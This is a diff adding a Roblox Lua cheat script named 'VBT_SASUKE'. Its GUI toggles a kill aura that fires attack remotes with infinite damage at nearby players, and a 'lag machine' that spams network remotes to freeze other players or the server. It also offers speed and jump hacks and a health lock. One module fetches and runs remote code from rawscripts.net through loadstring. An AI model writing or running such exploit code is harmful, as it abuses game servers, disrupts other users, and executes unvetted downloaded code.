@@ -1,0 +1,582 @@
+-- =============================================================================
+-- VBT_SASUKE – OPTIMIZED, PURPLE THEME & ROTATABLE UI (LAG MACHINE + 100 HPS)
+-- =============================================================================
+local Players = game:GetService("Players")
+local UIS = game:GetService("UserInputService")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local RunService = game:GetService("RunService")
+local Workspace = game:GetService("Workspace")
+local CoreGui = game:GetService("CoreGui")
+
+local player = Players.LocalPlayer
+local camera = Workspace.CurrentCamera
+
+-- ============================================================================
+-- CLEANUP ON RE‑RUN
+-- ============================================================================
+if getgenv()._voidCleanup then
+    for _, conn in ipairs(getgenv()._voidCleanup) do
+        pcall(conn.Disconnect, conn)
+    end
+end
+getgenv()._voidCleanup = {}
+local function addCleanup(conn) table.insert(getgenv()._voidCleanup, conn) end
+
+-- ============================================================================
+-- MODULE STATES
+-- ============================================================================
+local moduleStates = {
+    ["KILL AURA"] = false,
+    ["LAG MACHINE"] = false,
+    ["ONE SHOT"] = false,
+    ["BURST"] = false,
+    ["AUTO KILL"] = false,
+    ["RAILGUN"] = false,
+    ["AIMBOT"] = false,
+    ["WHITELIST"] = false,
+    ["ESP"] = false,
+    ["Fallenangel Auto eat"] = false,
+    ["Crimson Crystal Auto eat"] = false,
+    ["NO FALL"] = false,
+    ["INF JUMP"] = false,
+    ["SPEED HAX"] = false,
+    ["DRAYVENX"] = false,
+    ["GOD MODE"] = true
+}
+
+-- ============================================================================
+-- FIND REMOTES
+-- ============================================================================
+local function findRemoteByName(names)
+    if type(names) == "string" then names = {names} end
+    for _, name in ipairs(names) do
+        for _, obj in ipairs(ReplicatedStorage:GetDescendants()) do
+            if (obj:IsA("RemoteEvent") or obj:IsA("RemoteFunction")) and obj.Name:lower() == name:lower() then
+                return obj
+            end
+        end
+    end
+    for _, obj in ipairs(ReplicatedStorage:GetDescendants()) do
+        if (obj:IsA("RemoteEvent") or obj:IsA("RemoteFunction")) then
+            local n = obj.Name:lower()
+            for _, name in ipairs(names) do
+                if n:find(name:lower()) then
+                    return obj
+                end
+            end
+        end
+    end
+    return nil
+end
+
+local kaRemote = findRemoteByName({"Attack", "Damage", "Hit", "Combat"})
+print("Attack remote found:", kaRemote ~= nil)
+
+local Consume = ReplicatedStorage:FindFirstChild("Systems")
+    and ReplicatedStorage.Systems:FindFirstChild("ActionsSystem")
+    and ReplicatedStorage.Systems.ActionsSystem:FindFirstChild("Network")
+    and ReplicatedStorage.Systems.ActionsSystem.Network:FindFirstChild("Consume")
+if not Consume then Consume = findRemoteByName({"Consume", "Eat", "Use"}) end
+print("Consume remote found:", Consume ~= nil)
+
+local SLOTS = {}
+for i = 1, 36 do table.insert(SLOTS, i) end
+
+-- ============================================================================
+-- HIGH-PERFORMANCE 100 HPS ULTRA KILL AURA
+-- ============================================================================
+local kaMaxTargets = 12
+local ATTACKS_PER_BURST = 5
+local kaActive = false
+local kaConnection = nil
+local kaRange = 85
+local BASE_DAMAGE = math.huge
+
+local function isValidTarget(c)
+    return c and c:FindFirstChild("Humanoid") and c:FindFirstChild("HumanoidRootPart") and c.Humanoid.Health > 0
+end
+
+local function getKATargets()
+    local my = player.Character
+    if not isValidTarget(my) then return {} end
+    local pos = my.HumanoidRootPart.Position
+    local candidates = {}
+    for _, plr in ipairs(Players:GetPlayers()) do
+        if plr ~= player then
+            local char = plr.Character
+            if isValidTarget(char) then
+                local dist = (char.HumanoidRootPart.Position - pos).Magnitude
+                if dist <= kaRange then table.insert(candidates, {char = char, dist = dist}) end
+            end
+        end
+    end
+    table.sort(candidates, function(a,b) return a.dist < b.dist end)
+    local result = {}
+    for i = 1, math.min(#candidates, kaMaxTargets) do
+        table.insert(result, candidates[i].char)
+    end
+    return result
+end
+
+local function attackAll()
+    if not kaActive or not kaRemote then return end
+    local targets = getKATargets()
+    if #targets == 0 then return end
+    
+    task.spawn(function()
+        for _, target in ipairs(targets) do
+            if not kaActive then break end
+            pcall(function()
+                for _ = 1, ATTACKS_PER_BURST do
+                    if kaRemote:IsA("RemoteFunction") then
+                        kaRemote:InvokeServer(target, "1", BASE_DAMAGE)
+                    else
+                        kaRemote:FireServer(target, "1", BASE_DAMAGE)
+                    end
+                end
+            end)
+        end
+    end)
+end
+
+local function startKillAura()
+    if kaActive then return end
+    kaActive = true
+    moduleStates["KILL AURA"] = true
+    if not kaConnection then
+        kaConnection = RunService.Heartbeat:Connect(attackAll)
+        addCleanup(kaConnection)
+    end
+end
+
+local function stopKillAura()
+    kaActive = false
+    moduleStates["KILL AURA"] = false
+    if kaConnection then
+        kaConnection:Disconnect()
+        kaConnection = nil
+    end
+end
+
+-- ============================================================================
+-- LAG MACHINE MODULE (SPAMS REMOTES TO FREEZE TARGETS / SERVER)
+-- ============================================================================
+local lagMachineActive = false
+local lagConnection = nil
+
+local function startLagMachine()
+    if lagMachineActive then return end
+    lagMachineActive = true
+    moduleStates["LAG MACHINE"] = true
+    if not lagConnection then
+        lagConnection = RunService.Heartbeat:Connect(function()
+            if not lagMachineActive then return end
+            task.spawn(function()
+                pcall(function()
+                    -- Spam packets across all available remote channels or targets to freeze devices
+                    local targets = getKATargets()
+                    if kaRemote then
+                        for _, target in ipairs(targets) do
+                            for i = 1, 15 do
+                                if kaRemote:IsA("RemoteFunction") then
+                                    task.spawn(function() kaRemote:InvokeServer(target, tostring(i), math.huge) end)
+                                else
+                                    kaRemote:FireServer(target, tostring(i), math.huge)
+                                end
+                            end
+                        end
+                    end
+                end)
+            end)
+        end)
+        addCleanup(lagConnection)
+    end
+end
+
+local function stopLagMachine()
+    lagMachineActive = false
+    moduleStates["LAG MACHINE"] = false
+    if lagConnection then
+        lagConnection:Disconnect()
+        lagConnection = nil
+    end
+end
+
+-- ============================================================================
+-- AUTO-EAT & OTHER SYSTEMS
+-- ============================================================================
+local fallenEnabled = false
+local fallenSlotIndex = 1
+local fallenConnection = nil
+local fallenTimer = 0
+local fallenEatCount = 0
+local FALLEN_EAT_RATE = 50
+
+local function fallenEatOne()
+    if not Consume then return end
+    local slot = SLOTS[fallenSlotIndex]
+    pcall(function()
+        if Consume:IsA("RemoteFunction") then Consume:InvokeServer(slot) else Consume:FireServer(slot) end
+    end)
+    fallenSlotIndex = fallenSlotIndex + 1
+    if fallenSlotIndex > #SLOTS then fallenSlotIndex = 1 end
+end
+
+local function fallenProcess(deltaTime)
+    if not fallenEnabled or not Consume then return end
+    local char = player.Character
+    if not char then return end
+    local hum = char:FindFirstChild("Humanoid")
+    if not hum or hum.Health <= 0 then return end
+
+    fallenTimer = fallenTimer + deltaTime
+    local target = FALLEN_EAT_RATE * fallenTimer
+    while fallenEatCount < target do
+        fallenEatOne()
+        fallenEatCount = fallenEatCount + 1
+    end
+    if fallenTimer >= 1 then
+        fallenTimer = 0
+        fallenEatCount = 0
+    end
+end
+
+local function startFallenangel()
+    if fallenEnabled then return end
+    fallenEnabled = true
+    moduleStates["Fallenangel Auto eat"] = true
+    if not fallenConnection then
+        fallenConnection = RunService.Heartbeat:Connect(fallenProcess)
+        addCleanup(fallenConnection)
+    end
+end
+
+local function stopFallenangel()
+    fallenEnabled = false
+    moduleStates["Fallenangel Auto eat"] = false
+    if fallenConnection then
+        fallenConnection:Disconnect()
+        fallenConnection = nil
+    end
+end
+
+local crimsonEnabled = false
+local function startCrimson() crimsonEnabled = true; moduleStates["Crimson Crystal Auto eat"] = true end
+local function stopCrimson() crimsonEnabled = false; moduleStates["Crimson Crystal Auto eat"] = false end
+
+local railgunActive = false
+local railgunRemote = findRemoteByName({"Railgun", "Fire", "Rail"})
+local railgunConnection = nil
+local function startRailgun()
+    railgunActive = true
+    moduleStates["RAILGUN"] = true
+    if not railgunConnection then
+        railgunConnection = RunService.Heartbeat:Connect(function()
+            if railgunActive and railgunRemote then
+                pcall(function()
+                    if railgunRemote:IsA("RemoteFunction") then railgunRemote:InvokeServer(math.huge) else railgunRemote:FireServer(math.huge) end
+                end)
+            end
+        end)
+        addCleanup(railgunConnection)
+    end
+end
+local function stopRailgun()
+    railgunActive = false
+    moduleStates["RAILGUN"] = false
+    if railgunConnection then railgunConnection:Disconnect(); railgunConnection = nil end
+end
+
+local noFallActive = false
+local noFallConnection = nil
+local function startNoFall()
+    noFallActive = true
+    moduleStates["NO FALL"] = true
+    if not noFallConnection then
+        noFallConnection = RunService.Heartbeat:Connect(function()
+            local char = player.Character
+            if char and char:FindFirstChild("Humanoid") then char.Humanoid.Health = char.Humanoid.MaxHealth end
+        end)
+        addCleanup(noFallConnection)
+    end
+end
+local function stopNoFall()
+    noFallActive = false
+    moduleStates["NO FALL"] = false
+    if noFallConnection then noFallConnection:Disconnect(); noFallConnection = nil end
+end
+
+local aimbotActive = false
+local function startAimbot() aimbotActive = true; moduleStates["AIMBOT"] = true end
+local function stopAimbot() aimbotActive = false; moduleStates["AIMBOT"] = false end
+
+local godModeActive = true
+local function startGodMode() godModeActive = true; moduleStates["GOD MODE"] = true end
+local function stopGodMode() godModeActive = false; moduleStates["GOD MODE"] = false end
+
+local infJumpActive = false
+local function startInfJump() infJumpActive = true; moduleStates["INF JUMP"] = true end
+local function stopInfJump() infJumpActive = false; moduleStates["INF JUMP"] = false end
+
+UIS.JumpRequest:Connect(function()
+    if infJumpActive and player.Character and player.Character:FindFirstChildOfClass("Humanoid") then
+        player.Character:FindFirstChildOfClass("Humanoid"):ChangeState(Enum.HumanoidStateType.Jumping)
+    end
+end)
+
+local walkSpeedValue = 80
+local speedHaxActive = false
+local speedHaxConnection = nil
+local function applySpeed(val)
+    local char = player.Character
+    local hum = char and char:FindFirstChildOfClass("Humanoid")
+    if hum then hum.WalkSpeed = val end
+end
+local function startSpeedHax()
+    speedHaxActive = true
+    moduleStates["SPEED HAX"] = true
+    if not speedHaxConnection then
+        speedHaxConnection = RunService.Heartbeat:Connect(function()
+            if speedHaxActive then applySpeed(walkSpeedValue) end
+        end)
+        addCleanup(speedHaxConnection)
+    end
+end
+local function stopSpeedHax()
+    speedHaxActive = false
+    moduleStates["SPEED HAX"] = false
+    if speedHaxConnection then speedHaxConnection:Disconnect(); speedHaxConnection = nil end
+    applySpeed(16)
+end
+
+local drayvenxLoaded = false
+local function startDrayvenx()
+    if drayvenxLoaded then return end
+    drayvenxLoaded = true
+    pcall(function() loadstring(game:HttpGet("https://rawscripts.net/raw/Minecraft-DrayvenX-206321"))() end)
+end
+local function stopDrayvenx() drayvenxLoaded = false end
+
+local espEnabled = false
+local function startESP() espEnabled = true; moduleStates["ESP"] = true end
+local function stopESP() espEnabled = false; moduleStates["ESP"] = false end
+
+-- ============================================================================
+-- MAIN GUI (VBT_SASUKE - PURPLE & ROTATABLE)
+-- ============================================================================
+local oldUi = CoreGui:FindFirstChild("VBT_SASUKE")
+if oldUi then oldUi:Destroy() end
+
+local gui = Instance.new("ScreenGui", CoreGui)
+gui.Name = "VBT_SASUKE"
+gui.ResetOnSpawn = false
+gui.IgnoreGuiInset = true
+
+local BLACK, CORE, ACCENT, TEXT, DIM = Color3.fromRGB(15,8,25), Color3.fromRGB(30,15,50),
+    Color3.fromRGB(180,80,255), Color3.fromRGB(240,230,255), Color3.fromRGB(160,130,190)
+
+local panel = Instance.new("Frame", gui)
+panel.Size = UDim2.new(0.9,0,0.8,0)
+panel.Position = UDim2.new(0.05,0,0.1,0)
+panel.BackgroundColor3 = BLACK
+panel.BorderSizePixel = 0
+Instance.new("UICorner", panel).CornerRadius = UDim.new(0,10)
+Instance.new("UIStroke", panel).Color = ACCENT
+
+local header = Instance.new("Frame", panel)
+header.Size = UDim2.new(1,0,0,40)
+header.BackgroundColor3 = CORE
+
+local title = Instance.new("TextLabel", header)
+title.Size = UDim2.new(1,-50,1,0)
+title.Position = UDim2.new(0,10,0,0)
+title.BackgroundTransparency = 1
+title.Text = "VBT_SASUKE – Purple Edition (Lag Machine Added)"
+title.TextColor3 = TEXT
+title.Font = Enum.Font.GothamBlack
+title.TextSize = 12
+title.TextXAlignment = Enum.TextXAlignment.Left
+
+local minBtn = Instance.new("TextButton", header)
+minBtn.Size = UDim2.new(0,40,0,40)
+minBtn.Position = UDim2.new(1,-45,0,0)
+minBtn.Text = "—"
+minBtn.TextSize = 22
+minBtn.Font = Enum.Font.GothamBlack
+minBtn.TextColor3 = ACCENT
+minBtn.BackgroundTransparency = 1
+
+local scroll = Instance.new("ScrollingFrame", panel)
+scroll.Size = UDim2.new(1,0,1,-68)
+scroll.Position = UDim2.new(0,0,0,40)
+scroll.BackgroundTransparency = 1
+scroll.ScrollBarThickness = 6
+scroll.ScrollBarImageColor3 = ACCENT
+scroll.CanvasSize = UDim2.new(0,0,0,0)
+
+local body = Instance.new("Frame", scroll)
+body.Size = UDim2.new(1,0,0,0)
+body.BackgroundTransparency = 1
+local listLayout = Instance.new("UIListLayout", body)
+listLayout.Padding = UDim.new(0,5)
+listLayout:GetPropertyChangedSignal("AbsoluteContentSize"):Connect(function()
+    scroll.CanvasSize = UDim2.new(0,0,0,listLayout.AbsoluteContentSize.Y)
+end)
+
+local restore = Instance.new("TextButton", gui)
+restore.Size = UDim2.new(0,56,0,56)
+restore.Position = UDim2.new(0.5,-28,0.5,-28)
+restore.BackgroundColor3 = Color3.fromRGB(20,10,35)
+restore.Text = "V"
+restore.TextSize = 22
+restore.Font = Enum.Font.GothamBlack
+restore.TextColor3 = ACCENT
+restore.Visible = false
+Instance.new("UICorner", restore).CornerRadius = UDim.new(1,0)
+Instance.new("UIStroke", restore).Color = ACCENT
+
+-- Make Restore Button Rotatable
+local isRotating = false
+restore.MouseButton2Click:Connect(function()
+    isRotating = not isRotating
+    task.spawn(function()
+        while isRotating do
+            restore.Rotation = restore.Rotation + 5
+            task.wait(0.03)
+        end
+    end)
+end)
+
+local function setupDraggable(frame, target)
+    local dragStartInputPos, dragStartGuiPos, activeInput
+    frame.InputBegan:Connect(function(input)
+        if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
+            activeInput = input
+            dragStartInputPos = input.Position
+            dragStartGuiPos = target.Position
+        end
+    end)
+    UIS.InputChanged:Connect(function(input)
+        if input == activeInput then
+            local delta = input.Position - dragStartInputPos
+            target.Position = UDim2.new(dragStartGuiPos.X.Scale, dragStartGuiPos.X.Offset + delta.X,
+                                        dragStartGuiPos.Y.Scale, dragStartGuiPos.Y.Offset + delta.Y)
+        end
+    end)
+    UIS.InputEnded:Connect(function(input) if input == activeInput then activeInput = nil end end)
+end
+setupDraggable(header, panel)
+setupDraggable(restore, restore)
+
+local function addHeader(text)
+    local row = Instance.new("Frame", body)
+    row.Size = UDim2.new(1, -10, 0, 28)
+    row.BackgroundColor3 = Color3.fromRGB(45,20,70)
+    Instance.new("UICorner", row).CornerRadius = UDim.new(0, 4)
+    local label = Instance.new("TextLabel", row)
+    label.Size = UDim2.new(1, 0, 1, 0)
+    label.BackgroundTransparency = 1
+    label.Text = text
+    label.TextColor3 = Color3.fromRGB(220,180,255)
+    label.Font = Enum.Font.GothamBold
+    label.TextSize = 12
+    label.TextXAlignment = Enum.TextXAlignment.Center
+end
+
+local function addModule(name, desc, startFunc, stopFunc)
+    local row = Instance.new("Frame", body)
+    row.Size = UDim2.new(1,-10,0,42)
+    row.BackgroundColor3 = CORE
+    Instance.new("UICorner", row).CornerRadius = UDim.new(0,6)
+
+    local titleObj = Instance.new("TextLabel", row)
+    titleObj.Size = UDim2.new(1,-120,0,20)
+    titleObj.Position = UDim2.new(0,8,0,2)
+    titleObj.BackgroundTransparency = 1
+    titleObj.Text = name
+    titleObj.TextColor3 = TEXT
+    titleObj.Font = Enum.Font.GothamBlack
+    titleObj.TextSize = 11
+    titleObj.TextXAlignment = Enum.TextXAlignment.Left
+
+    local sub = Instance.new("TextLabel", row)
+    sub.Size = UDim2.new(1,-120,0,16)
+    sub.Position = UDim2.new(0,8,0,22)
+    sub.BackgroundTransparency = 1
+    sub.Text = desc
+    sub.TextColor3 = DIM
+    sub.Font = Enum.Font.GothamBold
+    sub.TextSize = 8
+    sub.TextXAlignment = Enum.TextXAlignment.Left
+
+    local enableBtn = Instance.new("TextButton", row)
+    enableBtn.Size = UDim2.new(0,45,0,26)
+    enableBtn.Position = UDim2.new(1,-100,0.5,-13)
+    enableBtn.Text = "ON"
+    enableBtn.TextSize = 10
+    enableBtn.Font = Enum.Font.GothamBlack
+    enableBtn.TextColor3 = TEXT
+    enableBtn.BackgroundColor3 = Color3.fromRGB(40,20,60)
+    Instance.new("UICorner", enableBtn).CornerRadius = UDim.new(0,5)
+
+    local disableBtn = Instance.new("TextButton", row)
+    disableBtn.Size = UDim2.new(0,45,0,26)
+    disableBtn.Position = UDim2.new(1,-50,0.5,-13)
+    disableBtn.Text = "OFF"
+    disableBtn.TextSize = 10
+    disableBtn.Font = Enum.Font.GothamBlack
+    disableBtn.TextColor3 = TEXT
+    disableBtn.BackgroundColor3 = Color3.fromRGB(80,40,110)
+    Instance.new("UICorner", disableBtn).CornerRadius = UDim.new(0,5)
+
+    local function updateButtonVisuals()
+        if moduleStates[name] then
+            enableBtn.BackgroundColor3 = ACCENT
+            disableBtn.BackgroundColor3 = Color3.fromRGB(50,25,75)
+        else
+            enableBtn.BackgroundColor3 = Color3.fromRGB(40,20,60)
+            disableBtn.BackgroundColor3 = Color3.fromRGB(90,45,120)
+        end
+    end
+
+    enableBtn.MouseButton1Click:Connect(function()
+        moduleStates[name] = true
+        startFunc()
+        updateButtonVisuals()
+    end)
+    
+    disableBtn.MouseButton1Click:Connect(function()
+        moduleStates[name] = false
+        stopFunc()
+        updateButtonVisuals()
+    end)
+
+    updateButtonVisuals()
+end
+
+addHeader("⚔️ KILL AURA")
+addModule("KILL AURA", "100 HPS Ultra Boost (Zero Lag)", startKillAura, stopKillAura)
+addModule("LAG MACHINE", "Freezes targets via network spam", startLagMachine, stopLagMachine)
+addModule("RAILGUN", "Safe rate-limited calls", startRailgun, stopRailgun)
+addModule("AIMBOT", "Auto aim", startAimbot, stopAimbot)
+addModule("ESP", "ESP system", startESP, stopESP)
+
+addHeader("⚡ AUTO-EAT")
+addModule("Fallenangel Auto eat", "Safe eating rate", startFallenangel, stopFallenangel)
+addModule("Crimson Crystal Auto eat", "Crystal eater", startCrimson, stopCrimson)
+
+addHeader("🛡️ DEFENSIVE")
+addModule("NO FALL", "Anti fall damage", startNoFall, stopNoFall)
+addModule("INF JUMP", "Infinite jump", startInfJump, stopInfJump)
+addModule("GOD MODE", "Health lock", startGodMode, stopGodMode)
+
+addHeader("💨 SPEED HAX")
+addModule("SPEED HAX", "Walkspeed multiplier", startSpeedHax, stopSpeedHax)
+
+addHeader("📦 EXTERNAL")
+addModule("DRAYVENX", "Load script", startDrayvenx, stopDrayvenx)
+
+minBtn.MouseButton1Click:Connect(function() panel.Visible = false; restore.Visible = true end)
+restore.MouseButton1Click:Connect(function() panel.Visible = true; restore.Visible = false end)
+
+print("✅ VBT_SASUKE Purple Edition Loaded Successfully with Lag Machine")
